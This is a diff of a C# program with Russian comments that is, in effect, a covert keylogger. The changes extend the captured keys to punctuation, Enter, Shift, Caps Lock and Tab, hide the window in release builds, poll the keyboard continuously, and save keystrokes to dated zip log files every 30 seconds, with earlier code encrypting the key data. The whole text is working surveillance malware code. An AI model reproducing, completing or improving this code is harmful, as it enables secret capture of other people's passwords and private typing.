@@ -75,7 +75,6 @@ namespace Foo
           using (MemoryStream byte_stream = new MemoryStream(keys_bytes))
           {
             Foo.Cryptography.EncryptData(byte_stream, file_stream, password, salt);
-            //byte_stream.CopyTo(file_stream);
           }
         }
       }
@@ -148,7 +147,6 @@ namespace Foo
       bool is_any_key_pressed = false;
 
       foreach (Keys k in scanned_key_set)
-      // foreach (Keys k in Enum.GetValues(typeof(Keys)))
       {
         if (IsPressed(k))
         {
@@ -184,7 +182,7 @@ namespace Foo
       // нажатия из хоста не ловятся
       scanned_key_set = new List<Keys>()
       {
-        // _vs
+        // Буквы и цифры
         Keys.A,
         Keys.B,
         Keys.C,
@@ -211,8 +209,6 @@ namespace Foo
         Keys.X,
         Keys.Y,
         Keys.Z,
-
-        // _vs
         Keys.D0,
         Keys.D1,
         Keys.D2,
@@ -224,10 +220,26 @@ namespace Foo
         Keys.D8,
         Keys.D9,
 
-        // Кнопки NumPad
-        // Разные коды в зависимости от NumLock)
-        // На экранной клавиатуре нет таких кнопок
-        // tv 
+        // Другие печатные символы. Слева-направо сверху-вниз по PC/AT.
+        Keys.Oemtilde,
+        (Keys)189,
+        (Keys)187,
+        Keys.OemPipe,
+        Keys.Back,
+        Keys.Tab,
+        Keys.OemOpenBrackets,
+        Keys.OemCloseBrackets,
+        Keys.Enter,
+        (Keys)20,
+        Keys.OemSemicolon,
+        Keys.OemQuotes,
+        Keys.ShiftKey,
+        Keys.Oemcomma,
+        Keys.OemPeriod,
+        (Keys)191,
+        Keys.Space,
+
+        // Numric Keypad
         Keys.NumPad0,
         Keys.NumPad1,
         Keys.NumPad2,
@@ -243,24 +255,8 @@ namespace Foo
         Keys.Multiply,
         Keys.Divide,
 
-        // Управляющие кнопки
-        Keys.ShiftKey, //  v 
-        Keys.Back,     // tvs
-        Keys.Enter,    // tvs
-        Keys.Escape,   // tvs
-        Keys.Tab,      // tvs
-
-        Keys.Oemtilde,          // _vs
-        Keys.OemOpenBrackets,   // _vs
-        Keys.OemCloseBrackets,  // _vs
-        Keys.OemSemicolon,      // _vs
-        Keys.OemQuotes,         // _vs
-        Keys.Oemcomma,          // _vs
-        Keys.OemPeriod,         //  v 
-        //(Keys)189,              //  v 
-        //(Keys)160,
-        Keys.OemPipe,           // _vs
-        Keys.Space,             // _vs
+        // Прочие
+        Keys.Escape,
       };
 
       scanned_key_set = scanned_key_set.OrderBy(x => x).ToList();
@@ -268,15 +264,21 @@ namespace Foo
       keys_to_str = new Dictionary<Keys, string>()
       {
         {Keys.Oemtilde, "`"},
+        {(Keys)189, "-"},
+        {(Keys)187, "="},
+        {Keys.OemPipe, "\\"},
+        {Keys.Back, "<Back>"},
+        {Keys.Tab, "<Tab>"},
         {Keys.OemOpenBrackets, "["},
         {Keys.OemCloseBrackets, "]"},
+        {Keys.Enter, "<Enter>"},
+        {(Keys)20, "<Caps Lock>"},
         {Keys.OemSemicolon, ";"},
         {Keys.OemQuotes, "'"},
+        {Keys.ShiftKey, "<Shift>"},
         {Keys.Oemcomma, ","},
         {Keys.OemPeriod, "."},
-        //{(Keys)189, "_"},
-        //{(Keys)160, "="},
-        {Keys.OemPipe, "\\"},
+        {(Keys)191, "/"},
         {Keys.Space, "<Space>"},
 
         {Keys.Add, "+"},
@@ -284,31 +286,40 @@ namespace Foo
         {Keys.Multiply, "*"},
         {Keys.Divide, "/"},
 
-        {Keys.ShiftKey, "<Shift>"},
-        {Keys.Back, "<Back>"},
-        {Keys.Enter, "<Enter>"},
         {Keys.Escape, "<Esc>"},
-        {Keys.Tab, "<Tab>"},
       };
     }
 
     static void Main()
     {
+#if !DEBUG
       Hide();
+#endif
+
       InitializeKeys();
 
-      const int sleep_ms = 2;
-      const int scan_time_ms = 15;
-      const ulong j = 15 * 60 * 1000 / (sleep_ms + scan_time_ms);
+#if DEBUG
+      foreach (Keys k in scanned_key_set)
+      {
+        Console.WriteLine("{0} {1}", (int)k, ToString(k));
+      }
+#endif
+
+      const int sleep_ms = 0;
+      const long TICKS_PER_SECOND = TimeSpan.TicksPerSecond;
       const int max_buffer_count = 4096 - 14;
 
       while (true)
       {
-        for (ulong i = 0; i < j && keys_buffer.Count() < max_buffer_count; i++)
+        long last_save_tick = DateTime.Now.Ticks;
+        Console.WriteLine("last_save_tick = {0}", last_save_tick);
+
+        do
         {
           Thread.Sleep(sleep_ms);
           ScanKeyboard();
-        }
+        } while (keys_buffer.Count() < max_buffer_count
+          && DateTime.Now.Ticks - last_save_tick < TICKS_PER_SECOND * 30);
 
         SaveToZip("logs/" + DateTime.Now.ToString("yyyy_MM_dd") + ".zip",
           DateTime.Now.ToString("hh_mm_ss") + ".txt");
@@ -317,4 +328,4 @@ namespace Foo
   }
 }
 // ЦП 0%
-// Память 7300 КБ, на что?
+// Память 6 МБ
